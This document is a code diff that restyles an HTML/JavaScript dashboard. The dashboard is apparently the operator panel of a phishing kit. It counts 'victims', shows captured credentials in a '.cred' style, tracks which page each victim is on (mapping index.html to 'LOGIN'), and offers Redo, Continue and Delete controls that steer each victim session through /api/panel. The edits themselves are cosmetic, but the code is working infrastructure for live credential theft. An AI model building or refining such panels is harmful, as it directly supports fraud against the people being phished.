@@ -21,12 +21,11 @@
     * { box-sizing: border-box; font-family: InterVariable, Inter, system-ui, sans-serif; }
     body { margin: 0; background: radial-gradient(circle at 50% -20%, #111 0%, #000 60%); color: var(--text-primary); }
 
-    /* ----------  GREETING BAR  ---------- */
     .greet-bar {
       max-width: 1120px;
       margin: 32px auto 0;
       padding: 0 28px;
-      font-size: 20px;
+      font-size: 34px;
       font-weight: 600;
       line-height: 1.05;
     }
@@ -46,23 +45,18 @@
     td { padding: .6rem .5rem; border-bottom: 1px solid #f0f0f0; }
     tr:hover { background: #fafafa; }
 
-    /* ----------  CLEAN BUTTONS  ---------- */
+    /* ----------  CLEAN GREY BUTTONS  ---------- */
     .btn {
       padding: .35rem .75rem;
       font-size: .8rem;
       border-radius: 6px;
-      border: 1px solid transparent;
+      border: 1px solid rgba(255,255,255,.08);
+      background: rgba(255,255,255,.08);
+      color: var(--text-primary);
       cursor: pointer;
       transition: all .18s ease;
     }
-    .btn-outline { background: transparent; border-color: rgba(255,255,255,.2); color: var(--text-primary); }
-    .btn-outline:hover { background: rgba(255,255,255,.05); border-color: rgba(255,255,255,.35); }
-
-    .btn-grey { background: rgba(255,255,255,.08); border-color: rgba(255,255,255,.08); color: var(--text-primary); }
-    .btn-grey:hover { background: rgba(255,255,255,.15); border-color: rgba(255,255,255,.2); }
-
-    .btn-danger { background: var(--red); border-color: var(--red); color: #000; }
-    .btn-danger:hover { background: #e94355; border-color: #e94355; }
+    .btn:hover { background: rgba(255,255,255,.15); border-color: rgba(255,255,255,.2); }
 
     .cred { font-family: monospace; font-size: .8rem; background: #f1f1f1; padding: 2px 4px; border-radius: 3px; color:#000; }
     .detail { font-size: 12px; color: var(--text-muted); }
@@ -73,7 +67,6 @@
   </style>
 </head>
 <body>
-  <!-- ----------  GREETING  ---------- -->
   <div class="greet-bar">Hello, <span id="userName">admin</span>! • <span id="clock">--:-- --</span></div>
 
   <div class="dashboard">
@@ -98,13 +91,13 @@
   <div id="modal" onclick="if(event.target===this)closeModal()">
     <div class="card">
       <div style="display:flex;justify-content:space-between;align-items:center">
-        <h3 style="margin:0">Session Detail</h3><button onclick="closeModal()" class="btn btn-outline">✕</button>
+        <h3 style="margin:0">Session Detail</h3><button onclick="closeModal()" class="btn">✕</button>
       </div>
       <div id="modalBody" style="margin-top:1rem;font-size:13px;line-height:1.6"></div>
       <div style="margin-top:1.25rem;display:flex;gap:8px">
-        <button id="redoBtn"  class="btn btn-grey"  onclick="act('redo',  currentSid)">🔁 Redo</button>
-        <button id="contBtn"  class="btn btn-grey"  onclick="act('cont',  currentSid)">✅ Continue</button>
-        <button class="btn btn-danger" onclick="act('delete',currentSid)">🗑 Delete</button>
+        <button id="redoBtn"  class="btn" onclick="act('redo',  currentSid)">🔁 Redo</button>
+        <button id="contBtn"  class="btn" onclick="act('cont',  currentSid)">✅ Continue</button>
+        <button class="btn" onclick="act('delete',currentSid)">🗑 Delete</button>
       </div>
     </div>
   </div>
@@ -113,7 +106,6 @@
     let currentSid = null;
     const qs = s => document.querySelector(s);
 
-    /* ----------  CLOCK  ---------- */
     function updateClock(){
       const now = new Date();
       const h = now.getHours(), m = now.getMinutes();
@@ -123,7 +115,6 @@
     }
     updateClock(); setInterval(updateClock, 1000);
 
-    /* ----------  PAGE TITLE MAPPER  ---------- */
     function pageTitle(file){
       switch(file){
         case 'index.html':    return 'LOGIN';
@@ -134,7 +125,6 @@
       }
     }
 
-    /* ----------  RENDER  ---------- */
     function render(d){
       qs('#active').textContent   = d.active;
       qs('#total').textContent    = d.totalVictims;
@@ -159,11 +149,10 @@
           <td>${s.platform}</td>
           <td>${s.browser}</td>
           <td>${pageTitle(s.page)}</td>
-          <td><button class="btn btn-outline" onclick="showDetail('${s.sid}')">Manage</button></td>
+          <td><button class="btn" onclick="showDetail('${s.sid}')">Manage</button></td>
         </tr>`).join('');
     }
 
-    /* ----------  DETAIL MODAL  ---------- */
     function showDetail(sid){
       const s = jsonData.sessions.find(x=>x.sid===sid);
       if(!s)return;
@@ -190,13 +179,11 @@
     }
     function closeModal(){ qs('#modal').style.display='none'; }
 
-    /* ----------  ACTIONS  ---------- */
     async function act(action,sid){
       await fetch('/api/panel',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({action,sid})});
       closeModal(); load();
     }
 
-    /* ----------  POLL  ---------- */
     let jsonData = {};
     async function load(){
       jsonData = await fetch('/api/panel').then(r=>r.json());
